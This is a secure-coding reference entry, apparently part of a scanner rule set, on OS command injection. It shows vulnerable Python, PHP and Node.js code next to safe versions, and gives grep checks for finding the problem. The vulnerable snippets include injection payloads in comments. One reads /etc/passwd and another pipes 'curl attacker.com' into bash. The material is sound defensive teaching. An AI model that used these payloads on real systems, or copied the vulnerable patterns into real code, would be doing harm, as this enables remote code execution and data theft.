---
id: injection-command
title: OS Command Injection
severity: critical
tags: [injection, command-injection, rce, shell, subprocess]
taxonomy: security/injection/command
references:
  - https://owasp.org/www-community/attacks/Command_Injection
  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
---

# OS Command Injection

## Description

Command injection occurs when user input is passed to a system shell without sanitization. Attackers can append shell metacharacters (`;`, `&&`, `|`, `` ` ``, `$(...)`) to execute arbitrary commands with the web server's privileges. This can lead to full server compromise, data exfiltration, and lateral movement.

## Vulnerable Pattern

```python
# BAD — shell=True with user input (Python)
import subprocess, os

def convert_image(filename: str):
    os.system(f"convert {filename} output.png")
    # Payload: "image.jpg; cat /etc/passwd > /var/www/html/leak.txt"

def ping_host(host: str):
    result = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True, text=True)
    return result.stdout
    # Payload: "8.8.8.8 && id && whoami"
```

```php
# BAD — PHP exec/system with user input
$domain = $_GET['domain'];
$output = shell_exec("dig " . $domain);
// Payload: "example.com; cat /etc/passwd"
```

```javascript
// BAD — Node.js exec with template literal
const { exec } = require("child_process");
exec(`git clone ${req.body.repoUrl}`, (err, stdout) => { ... });
// Payload: "repo.git; curl attacker.com | bash"
```

## Secure Pattern

```python
# GOOD — list-form subprocess (no shell expansion)
import subprocess
import shlex

def ping_host(host: str):
    # Validate input first
    import ipaddress
    try:
        ipaddress.ip_address(host)  # only allow valid IPs
    except ValueError:
        raise ValueError("Invalid IP address")
    result = subprocess.run(
        ["ping", "-c", "1", host],  # list form — no shell=True
        capture_output=True, text=True, timeout=10
    )
    return result.stdout
```

```javascript
// GOOD — Node.js: execFile (no shell) or use library with no shell
const { execFile } = require("child_process");
const repoUrl = validateGitUrl(req.body.repoUrl);  // allowlist validation
execFile("git", ["clone", repoUrl], (err, stdout) => { ... });
```

## Checks to Generate

- Grep for `shell=True` in `subprocess.run`, `subprocess.Popen`, `subprocess.call` — flag all.
- Grep for `os.system(`, `os.popen(` with any non-literal argument.
- Grep for `exec(`, `shell_exec(`, `system(`, `passthru(` in PHP with user-derived input.
- Grep for `child_process.exec(` in Node.js with template literals or string concatenation.
- Flag `eval()` in any language where the argument includes user data.
- Grep for backtick execution in Perl/Ruby/shell scripts: `` `user_input` ``.
